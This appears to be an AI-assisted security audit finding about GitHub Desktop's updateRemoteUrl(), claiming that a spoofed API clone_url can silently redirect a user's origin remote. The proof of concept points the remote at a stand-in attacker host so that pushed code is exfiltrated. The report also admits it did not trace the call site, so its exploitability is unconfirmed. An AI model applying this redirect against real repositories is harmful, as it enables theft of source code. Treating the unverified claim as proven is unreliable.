# Missing Repository-Identity Verification Allows Silent Remote-URL Hijack from GitHub API Data - (File: app/src/lib/stores/updates/update-remote-url.ts)

### Summary
The Perpetual Protocol bug is a broken-invariant class: a function that mutates security-relevant state (funding growth used to compute withdrawable balance) trusted an untrusted caller/value without verifying the caller was the legitimate source (`_requireOnlyClearingHouse`). The Desktop analog is `updateRemoteUrl()`, which mutates a security-relevant value — the local git `origin` remote URL that determines where the user's future commits are pushed — based purely on a `clone_url` string returned by a GitHub API response, with no check that the API object actually refers to the *same* repository the user is working in (e.g., no repository-ID comparison).

### Finding Description
`updateRemoteUrl()` [1](#0-0)  is called with a `GitHubRepository` and a fetched `IAPIRepository`/`IAPIFullRepository` object, and decides whether to overwrite the repository's local git remote: [2](#0-1) 

The guard logic only checks:
1. That the *protocol* of the old and new URL match (`protocolsMatch`).
2. That the *previously stored* GitHub API clone URL structurally matched the current local remote (`remoteUrlUnchanged`, via `urlMatchesRemote`, which itself only compares hostname/owner/name strings) [3](#0-2) .
3. That the new URL differs from the current remote (`!urlsMatch`).

None of these checks validate that the incoming `apiRepo` object is describing the *same repository entity* (e.g. by a stable numeric repository id). The function only performs a structural string comparison (`hostname`/`owner`/`name` parsed via `parseRemote`) [4](#0-3) , so any API response whose `clone_url` differs from the current remote — but still parses cleanly and shares protocol — will be written straight into the user's `origin` remote via `gitStore.setRemoteURL()`: [5](#0-4) 

This is exactly the same class of flaw as the Perpetual Protocol bug: a state-mutating operation (`setRemoteURL`, analogous to the poisoned `twPremiumX96` funding write) is invoked based on unauthenticated/unverified attacker-influenced input (the `clone_url` field of a fetched GitHub API object, analogous to the attacker calling the unguarded funding function directly) instead of being restricted to a value whose provenance/identity has been cryptographically or structurally re-verified against the original repository.

### Impact Explanation
If a user's GitHub API metadata source can be influenced by an attacker — for example a malicious/compromised GitHub Enterprise Server endpoint the user has added as an account, or a man-in-the-middle/hostile mirrror returning a crafted `IAPIFullRepository` payload — Desktop will silently rewrite the user's `origin` remote to point at a URL of the attacker's choosing (as long as protocol matches, e.g., still `https:`). Because this happens silently in the background (no user prompt, no diff confirmation), all subsequent `git push` operations from that point on would go to the attacker-controlled remote instead of the legitimate one, resulting in exfiltration of proprietary source code and history, and "silent corruption of what the user … pushes" — one of the explicitly listed valid impacts in this assessment's scope.

### Likelihood Explanation
The precondition is that the fetched `IAPIFullRepository`/`IAPIRepository` object used to drive this update originates from a source the attacker can influence (a GitHub Enterprise endpoint, or a compromised/spoofed API response), which is one of the attacker capabilities explicitly declared in-scope ("a GitHub API object"). No local access, admin rights, or social engineering step beyond normal usage of an already-added account/repository is required; the update path runs automatically as part of routine repository metadata refresh. The main residual uncertainty is the exact call-site trigger condition inside `app-store.ts` (which repository refresh flow invokes `updateRemoteUrl`) — this was not fully traced due to tool-call limits, so the precise refresh cadence/trigger and whether additional upstream checks exist before this call could not be confirmed with full certainty.

### Recommendation
Add an authoritative identity check before rewriting the remote URL — e.g., compare the numeric GitHub repository `id` (already stored in `GitHubRepository`) against the `id` in the freshly fetched `apiRepo`, and refuse to update the remote if the id doesn't match the previously known one. At minimum, surface a user-facing confirmation before silently changing `origin`, rather than performing the rewrite automatically based solely on string URL/protocol matching.

### Proof of Concept
1. User adds a GitHub Enterprise account/repository whose API endpoint is attacker-controlled (or an MITM-capable network position exists for that endpoint).
2. During a normal repository metadata refresh, the attacker's API server returns an `IAPIFullRepository` object where `clone_url` is `https://attacker.example/user/repo` while all other fields validate normally.
3. `updateRemoteUrl()` sees `protocolsMatch === true`, `remoteUrlUnchanged === true` (the locally stored remote still structurally matches the previously cached API URL), and `urlsMatch === false` (new URL differs) [6](#0-5) .
4. `gitStore.setRemoteURL('origin', 'https://attacker.example/user/repo')` executes silently [7](#0-6) , and the existing unit test confirms this exact rewrite behavior occurs whenever the API `clone_url` changes [8](#0-7) .
5. The user's next `git push` silently goes to the attacker's remote.

### Citations

**File:** app/src/lib/stores/updates/update-remote-url.ts (L7-44)
```typescript
export async function updateRemoteUrl(
  gitStore: GitStore,
  gitHubRepository: GitHubRepository,
  apiRepo: IAPIRepository
): Promise<void> {
  // I'm not sure when these early exit conditions would be met. But when they are
  // we don't have enough information to continue so exit early!
  if (gitStore.defaultRemote === null) {
    return
  }

  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
```

**File:** app/src/lib/repository-matching.ts (L83-118)
```typescript
/**
 * Check whether or not a GitHub repository URL matches a given remote, by
 * parsing and comparing the structure of the each URL.
 *
 * @param url a URL associated with the GitHub repository
 * @param remote the remote details found in the Git repository
 */
export function urlMatchesRemote(url: string | null, remote: IRemote): boolean {
  if (url == null) {
    return false
  }

  const cloneUrl = parseRemote(url)
  const remoteUrl = parseRemote(remote.url)

  if (remoteUrl == null || cloneUrl == null) {
    return false
  }

  if (!caseInsensitiveEquals(remoteUrl.hostname, cloneUrl.hostname)) {
    return false
  }

  if (remoteUrl.owner == null || cloneUrl.owner == null) {
    return false
  }

  if (remoteUrl.name == null || cloneUrl.name == null) {
    return false
  }

  return (
    caseInsensitiveEquals(remoteUrl.owner, cloneUrl.owner) &&
    caseInsensitiveEquals(remoteUrl.name, cloneUrl.name)
  )
}
```

**File:** app/src/lib/remote-parsing.ts (L54-64)
```typescript
/** Parse the remote information from URL. */
export function parseRemote(url: string): IGitRemoteURL | null {
  for (const { protocol, regex } of remoteRegexes) {
    const match = regex.exec(url)
    if (match !== null && match.length >= 4) {
      return { protocol, hostname: match[1], owner: match[2], name: match[3] }
    }
  }

  return null
}
```

**File:** app/test/unit/stores/updates/update-remote-url-test.ts (L68-81)
```typescript
  it("updates the repository's remote url when the github url changes", async t => {
    const { gitHubRepository, gitStore } = await createRepository(
      t,
      apiRepository
    )
    assert(gitStore.currentRemote !== null)

    const originalUrl = gitStore.currentRemote.url
    const updatedUrl = 'https://github.com/my-user/my-updated-repo'
    const updatedApiRepository = { ...apiRepository, clone_url: updatedUrl }
    await updateRemoteUrl(gitStore, gitHubRepository, updatedApiRepository)
    assert.notEqual(originalUrl, updatedUrl)
    assert.equal(gitStore.currentRemote.url, updatedUrl)
  })
```
